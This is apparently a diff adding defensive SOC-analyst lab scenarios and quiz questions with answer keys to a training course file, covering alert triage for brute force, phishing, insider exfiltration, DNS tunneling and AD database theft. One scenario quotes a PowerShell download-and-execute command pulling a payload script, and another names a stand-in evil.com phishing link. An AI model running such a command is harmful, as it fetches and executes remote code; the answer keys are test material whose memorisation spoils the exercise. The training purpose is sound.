@@ -2959,6 +2959,33 @@ EventCode=4625 | stats count by src_ip     # Add grouping
         "Filter to show only IPs with more than 5 failures",
         "Add user information to the output",
         "Sort by count and limit to top 10"
+      ],
+      labScenario: "Your SIEM receives an alert: 'Excessive Failed Logins Detected.' The correlation rule triggered because 85 failed login attempts (Event ID 4625) were recorded against the 'admin' account from IP 203.0.113.50 within 3 minutes. Shortly after, a successful login (Event ID 4624) from the same IP was logged. The source IP is geolocated to a country your organization has no business with. A follow-up query shows the same IP performed a port scan on the internal network 10 minutes later.",
+      labQuestions: [
+        {
+          id: "4.3-q1",
+          question: "What type of attack does this pattern of 85 failed logins followed by a successful login indicate?",
+          answer: "brute force",
+          hint: "Think about an attack that tries many passwords until one works."
+        },
+        {
+          id: "4.3-q2",
+          question: "Which Windows Event ID indicates the successful login after the brute force attempt?",
+          answer: "4624",
+          hint: "This is the standard Windows event for a successful logon."
+        },
+        {
+          id: "4.3-q3",
+          question: "What follow-up activity did the attacker perform after gaining access?",
+          answer: "port scan",
+          hint: "Look at what the IP did 10 minutes after login."
+        },
+        {
+          id: "4.3-q4",
+          question: "What is the source IP address involved in this attack?",
+          answer: "203.0.113.50",
+          hint: "Check the IP mentioned in the scenario."
+        }
       ]
     }
   },
@@ -4299,6 +4326,33 @@ Before escalating:
         "Determine if escalation is needed",
         "Complete an escalation template",
         "Identify any missing information for the handoff"
+      ],
+      labScenario: "At 14:32 UTC, your SIEM generates a high-severity alert: 'Data Exfiltration Detected — Outbound Transfer Exceeds Threshold.' Workstation WS-FIN-07 belonging to user 'sarah.chen' from the Finance department uploaded 2.3 GB of data to an external cloud storage service (mega.nz) over HTTPS. The transfer occurred during business hours. Checking the DLP logs, you find the transferred files include 'Q4_Financial_Report.xlsx', 'Employee_Salary_Data.csv', and 'Board_Meeting_Notes.docx'. Sarah's manager confirms she was not authorized to transfer these files externally. Her account shows no signs of compromise — MFA is enabled, and the login originated from her usual office IP.",
+      labQuestions: [
+        {
+          id: "5.5-q1",
+          question: "Based on the evidence, is this alert more likely a true positive or false positive?",
+          answer: "true positive",
+          hint: "The manager confirmed the transfer was unauthorized."
+        },
+        {
+          id: "5.5-q2",
+          question: "What type of insider threat does this scenario most likely represent?",
+          answer: "insider threat",
+          hint: "The user's account is not compromised — the actions came from the legitimate user."
+        },
+        {
+          id: "5.5-q3",
+          question: "Should this alert be escalated to L2? Answer yes or no.",
+          answer: "yes",
+          hint: "Consider the sensitivity of the data and the unauthorized nature of the transfer."
+        },
+        {
+          id: "5.5-q4",
+          question: "What external service was used to exfiltrate the data?",
+          answer: "mega.nz",
+          hint: "Check the cloud storage destination mentioned in the alert."
+        }
       ]
     }
   },
@@ -4886,6 +4940,33 @@ Enriched Alert to Analyst
         "Research a recent malware sample on ThreatFox",
         "Use Shodan to search for exposed services",
         "Document 5 tools you'll add to your daily workflow"
+      ],
+      labScenario: "During alert triage, you encounter a suspicious file downloaded by a user: 'update_patch.exe'. You extract the SHA256 hash: 'e99a18c428cb38d5f260853678922e03abd836f5d3a4e6f1b3c5e8d9f2a1b4c7'. A VirusTotal scan shows 48/72 vendors flagging it as malicious, categorized as 'Trojan.GenericKD.46543210'. The file was downloaded from 'http://198.51.100.23/updates/patch.exe'. AbuseIPDB shows the IP has been reported 347 times in the last 30 days for malware distribution. AlienVault OTX links this IP to the 'APT29' threat group with a recent pulse titled 'Cozy Bear Infrastructure Update Q1 2025'.",
+      labQuestions: [
+        {
+          id: "6.4-q1",
+          question: "How many VirusTotal vendors flagged the file as malicious?",
+          answer: "48",
+          hint: "Check the detection ratio in the scenario."
+        },
+        {
+          id: "6.4-q2",
+          question: "Which APT group is linked to the IP address used for distribution?",
+          answer: "APT29",
+          hint: "Check the AlienVault OTX information."
+        },
+        {
+          id: "6.4-q3",
+          question: "What is the IP address hosting the malicious file?",
+          answer: "198.51.100.23",
+          hint: "Look at the download URL in the scenario."
+        },
+        {
+          id: "6.4-q4",
+          question: "What is the common name for the APT29 threat group?",
+          answer: "Cozy Bear",
+          hint: "Check the OTX pulse title for the group's alias."
+        }
       ]
     }
   },
@@ -5939,6 +6020,33 @@ Recommendations:
         "Document a timeline of the incident",
         "Draft a user notification message",
         "Write three recommendations for prevention"
+      ],
+      labScenario: "At 09:15 AM, 12 employees in the HR department received an email from 'ceo@yourcompany-hr.com' (spoofed domain) with subject 'Urgent: Updated Benefits Enrollment'. The email contained a link to 'https://yourcompany-benefits.evil.com/enroll'. Three employees clicked the link and entered their corporate credentials on a fake login page. By 09:45 AM, the SOC detected unusual Office 365 activity: two of the compromised accounts had new inbox rules created forwarding all emails to an external address 'collector@protonmail.com'. One compromised account sent 45 emails to external contacts with an updated malicious link. The attacker also accessed the company's SharePoint and downloaded the 'Employee_Directory.xlsx' file.",
+      labQuestions: [
+        {
+          id: "7.5-q1",
+          question: "How many employees entered their credentials on the phishing page?",
+          answer: "3",
+          hint: "Look at how many employees clicked and submitted credentials."
+        },
+        {
+          id: "7.5-q2",
+          question: "What persistence mechanism did the attacker set up in the compromised mailboxes?",
+          answer: "inbox rules",
+          hint: "Think about how the attacker ensured continued access to emails."
+        },
+        {
+          id: "7.5-q3",
+          question: "What external email address were the forwarded emails sent to?",
+          answer: "collector@protonmail.com",
+          hint: "Check the inbox rule destination."
+        },
+        {
+          id: "7.5-q4",
+          question: "What sensitive file did the attacker download from SharePoint?",
+          answer: "Employee_Directory.xlsx",
+          hint: "Look at the SharePoint access activity."
+        }
       ]
     }
   },
@@ -6775,6 +6883,33 @@ Required Actions:
         "Analyze command lines for suspicious indicators",
         "Check network connections and file operations",
         "Document your findings and recommend actions"
+      ],
+      labScenario: "Your EDR platform generates a critical alert on workstation WS-DEV-03: 'Suspicious Process Chain Detected.' The process tree shows: outlook.exe → cmd.exe → powershell.exe → rundll32.exe. The PowerShell command line contains: 'IEX(New-Object Net.WebClient).DownloadString(\"http://10.0.0.50:8080/payload.ps1\")'. The rundll32.exe process then loaded a DLL from 'C:\\Users\\Public\\svchost.dll' and established a connection to 45.33.32.156 on port 4443. The EDR also detected LSASS memory access by the rundll32 process, indicating credential dumping. The affected user is 'dev-admin' who has local admin privileges on 15 workstations.",
+      labQuestions: [
+        {
+          id: "8.4-q1",
+          question: "What is the parent process that started the malicious chain?",
+          answer: "outlook.exe",
+          hint: "Look at the beginning of the process tree."
+        },
+        {
+          id: "8.4-q2",
+          question: "What technique is indicated by the LSASS memory access?",
+          answer: "credential dumping",
+          hint: "LSASS stores authentication credentials in memory."
+        },
+        {
+          id: "8.4-q3",
+          question: "What port is the C2 connection established on?",
+          answer: "4443",
+          hint: "Check the outbound connection details from rundll32."
+        },
+        {
+          id: "8.4-q4",
+          question: "What internal IP is hosting the PowerShell payload?",
+          answer: "10.0.0.50",
+          hint: "Look at the DownloadString URL in the PowerShell command."
+        }
       ]
     }
   },
@@ -7724,6 +7859,33 @@ Exfiltration:
         "Look for C2 communication patterns",
         "Find evidence of lateral movement",
         "Detect any data exfiltration indicators"
+      ],
+      labScenario: "Network monitoring tools detect anomalous traffic from server SRV-WEB-01 (192.168.1.100). The IDS flags DNS queries to 'x7k9m2.data-analytics-cdn.com' occurring every 30 seconds — each query encodes a different subdomain that appears to be Base64 data. Simultaneously, Zeek logs show SMB connections from SRV-WEB-01 to 5 internal hosts (192.168.1.50–54) on port 445, all within a 2-minute window. NetFlow data reveals a 500 MB transfer from 192.168.1.52 to SRV-WEB-01, followed by an outbound HTTPS connection from SRV-WEB-01 to 91.234.56.78 on port 8443 transferring 480 MB. The destination IP is not in any known CDN range.",
+      labQuestions: [
+        {
+          id: "9.4-q1",
+          question: "What technique is being used for C2 communication based on the DNS queries?",
+          answer: "DNS tunneling",
+          hint: "Encoded subdomains at regular intervals suggest data hidden in DNS."
+        },
+        {
+          id: "9.4-q2",
+          question: "How many internal hosts did the compromised server connect to via SMB?",
+          answer: "5",
+          hint: "Count the IP range 192.168.1.50 through 54."
+        },
+        {
+          id: "9.4-q3",
+          question: "What is the approximate size of data exfiltrated to the external IP?",
+          answer: "480 MB",
+          hint: "Check the outbound HTTPS transfer size."
+        },
+        {
+          id: "9.4-q4",
+          question: "What port was used for the outbound data exfiltration?",
+          answer: "8443",
+          hint: "Look at the HTTPS connection to the external IP."
+        }
       ]
     }
   },
@@ -7965,6 +8127,33 @@ Annually:
         "Identify what evidence you'd need to test each hypothesis",
         "Practice pivoting from the initial IOC to find related indicators",
         "Build a timeline of the scenario events"
+      ],
+      labScenario: "At 02:17 AM, your SIEM triggers a critical alert: 'Anomalous Privileged Account Activity.' The domain admin account 'da-backup' — normally used only by the backup system — logged in interactively (Event ID 4624, Logon Type 2) from workstation WS-REC-01 in the reception area. Within 8 minutes, the account accessed the Active Directory server (DC-01) via RDP, ran 'ntdsutil' to create a snapshot of the AD database, and copied the file to a USB-connected drive (E:\\backup.dit). No change tickets exist for this maintenance, and the backup team confirms no one was scheduled to work. The account's password was last changed 387 days ago.",
+      labQuestions: [
+        {
+          id: "10.1-q1",
+          question: "What tool was used to extract the Active Directory database?",
+          answer: "ntdsutil",
+          hint: "Check the commands run on the domain controller."
+        },
+        {
+          id: "10.1-q2",
+          question: "What Logon Type indicates an interactive (physical) logon?",
+          answer: "2",
+          hint: "Look at the Event ID 4624 details in the scenario."
+        },
+        {
+          id: "10.1-q3",
+          question: "How many days since the compromised account's password was last changed?",
+          answer: "387",
+          hint: "Check the password age mentioned at the end of the scenario."
+        },
+        {
+          id: "10.1-q4",
+          question: "Where was the AD database file copied to?",
+          answer: "USB",
+          hint: "Look at the destination drive letter and type."
+        }
       ]
     }
   },
